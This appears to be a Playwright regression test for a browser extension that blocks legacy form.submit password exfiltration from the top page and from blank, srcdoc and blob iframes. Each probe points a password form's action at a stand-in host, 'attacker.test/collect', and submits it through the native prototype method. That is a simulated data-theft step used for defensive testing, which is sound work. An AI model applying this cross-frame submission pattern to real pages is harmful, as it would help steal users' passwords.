/**
 * #1134: use the built MAIN-world guard, ordinary page-visible prototypes,
 * and intercepted requests. No private extension globals or manual injection.
 * Self-targeted child forms are measured separately from top-targeted forms:
 * installing a wrapper alone does not prove its cross-realm receiver is safe.
 */
import { chromium, expect, test, type BrowserContext, type Frame, type Page } from "@playwright/test";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { waitForNavSentinelBridge } from "./extension_test_utils";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "..");
const extensionPath = path.join(root, "extension", "dist");
const fixture = fs.readFileSync(path.join(root, "tests/e2e/fixtures/main-guard-fallback-frames.html"), "utf8");
const sourceUrl = "https://victim.test/main-guard-fallback-frames.html";
type Kind = "top" | "blank" | "srcdoc" | "blob";
type Shape = "own-self" | "own-top" | "borrowed-self";
let context: BrowserContext;
let profile: string;
const posts: string[] = [];

test.setTimeout(60_000);

test.beforeAll(async () => {
  // Fail rather than silently skip a proving run without the requested build.
  expect(fs.existsSync(path.join(extensionPath, "manifest.json"))).toBe(true);
  const profiles = path.join(root, "test-results", "fallback-frame-profiles");
  fs.mkdirSync(profiles, { recursive: true });
  profile = fs.mkdtempSync(path.join(profiles, "chromium-"));
  context = await chromium.launchPersistentContext(profile, {
    headless: false,
    timeout: 60_000,
    args: [`--disable-extensions-except=${extensionPath}`, `--load-extension=${extensionPath}`],
  });
  // Reserved synthetic hosts never reach DNS or an external service. Record
  // only case IDs at the network boundary, never submitted field contents.
  await context.route(/^https?:\/\//, async (route) => {
    const url = new URL(route.request().url());
    if (url.hostname === "victim.test") {
      await route.fulfill({ contentType: "text/html", body: fixture });
    } else if (url.hostname === "attacker.test") {
      if (route.request().method() === "POST") posts.push(url.searchParams.get("case") ?? "missing");
      await route.fulfill({ contentType: "text/html", body: "<!doctype html><title>Local intercepted sink</title>" });
    } else {
      await route.abort();
    }
  });
});

test.afterAll(async () => {
  await context?.close();
  if (profile) fs.rmSync(profile, { recursive: true, force: true });
});

async function openCase(kind: Kind): Promise<{ page: Page; realm: Frame }> {
  const page = await context.newPage();
  await page.goto(`${sourceUrl}?kind=${kind}`, { waitUntil: "load" });
  await waitForNavSentinelBridge(page);
  let realm = page.mainFrame();
  if (kind !== "top") {
    const frame = await page.locator("#probe-frame").elementHandle();
    const child = await frame?.contentFrame();
    if (!child) throw new Error(`Missing ${kind} fixture frame`);
    realm = child;
  }
  await realm.locator("#password-form").waitFor({ state: "attached" });
  // MAIN's CRXJS loader imports asynchronously. Allow a bounded settle window
  // even on the unfixed build, where a patched-prototype wait would time out.
  await page.waitForTimeout(1_000);
  return { page, realm };
}

async function observe(kind: Kind, shape: Shape) {
  const { page, realm } = await openCase(kind);
  const id = `${kind}-${shape}`;
  try {
    const patched = await realm.evaluate(() =>
      !Function.prototype.toString.call(HTMLFormElement.prototype.submit).includes("[native code]"),
    );
    const attempted = await realm.evaluate(({ id, shape }) => {
      const owner = shape === "borrowed-self" ? window.top!.document : document;
      const form = owner.querySelector<HTMLFormElement>("#password-form")!;
      form.action = `https://attacker.test/collect?case=${id}`;
      form.target = shape === "own-top" ? "_top" : "_self";
      let submitEvents = 0;
      let formdataEvents = 0;
      form.addEventListener("submit", () => { submitEvents += 1; });
      form.addEventListener("formdata", () => { formdataEvents += 1; });
      // Playwright evaluation supplies no trusted click or navigation grant.
      // This is the child realm's actual method, including when `form` belongs
      // to the top document. No test-owned replacement participates.
      HTMLFormElement.prototype.submit.call(form);
      return { submitEvents, formdataEvents };
    }, { id, shape });
    await page.waitForTimeout(1_000);
    const result = { kind, shape, patched, ...attempted, posts: posts.filter((entry) => entry === id).length };
    await test.info().attach(id, { body: JSON.stringify(result, null, 2), contentType: "application/json" });
    console.log(`[fallback-frame probe] ${JSON.stringify(result)}`);
    return result;
  } finally {
    await page.close();
  }
}

test("top-level legacy password submit is patched and blocked @regression", async () => {
  const result = await observe("top", "own-self");
  expect(result).toMatchObject({ patched: true, submitEvents: 0, formdataEvents: 0, posts: 0 });
});

// Soft assertions keep the whole before/after matrix visible if any protection
// is absent. They still fail the regression; no expected-failure laundering.
for (const kind of ["blank", "srcdoc", "blob"] as const) {
  test(`${kind}: MAIN coverage and own/borrowed password submits (#1134) @regression`, async () => {
    const self = await observe(kind, "own-self");
    const top = await observe(kind, "own-top");
    const borrowed = await observe(kind, "borrowed-self");
    for (const result of [self, top, borrowed]) {
      expect.soft(result.patched, `${kind} installs the MAIN submit wrapper`).toBe(true);
      expect.soft(result.submitEvents, "legacy submit dispatches no submit event").toBe(0);
      expect.soft(result.posts, `${kind} ${result.shape} cannot send the password POST`).toBe(0);
    }
  });
}
